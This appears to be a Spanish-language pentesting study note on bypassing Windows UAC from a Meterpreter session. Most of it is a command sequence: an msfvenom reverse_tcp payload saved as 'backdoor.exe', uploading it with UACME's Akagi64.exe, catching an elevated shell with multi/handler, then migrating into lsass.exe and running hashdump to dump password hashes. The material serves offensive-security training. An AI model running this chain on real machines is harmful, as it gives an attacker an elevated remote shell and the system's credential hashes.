
UAC ( User Account Control ) es una medida de seguridad de windows que se utiliza para prevenir cambios no autorizados en el sistema operativo. Requiere la aprovación de un usuario administrador.

**Necesitaremos un usuario del grupo de administradores para esta técnica**

![[Pasted image 20250220093215.png]]

 Partimos de una sesión de meterpreter en la que tenemos un usuario que pertenece al grupo de administradores.

![[Pasted image 20250220094704.png]]

Aún así si vemos los privilegios del usuario vemos que no tiene los privilegios de un superusuario.

![[Pasted image 20250220094737.png]]

Vamos a generar un payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
```

Esta técnica utiliza el binario akagi.exe y es importante acceder al git para ver la versión que utilizar según el sistema Operativo a atacar.

Git:

Vamos a subir el binario al sistema desde la sesión de meterpreter:

```bash

#Subimos tanto el payload de msfvenom como el binario que nos permite hacer el bypass de UAC
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe

#Ponemos la sesión actual en el fondo
background

#Abrimos un multi/handler
use exploit /multi/handler
show options
exploit

#Volvemos a la sesión anterior y ejecutamos el bypass. Posteriormente metemos la sesión en el fondo
sessions 1
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
^C
background

#Vamos a la sesión que tenía el multi/handler y vemos que ahora si tenemos los privilegios de un administrador. El migrate importante.
sessions 2
getprivs
migrate -N lsass.exe
hashdump
```
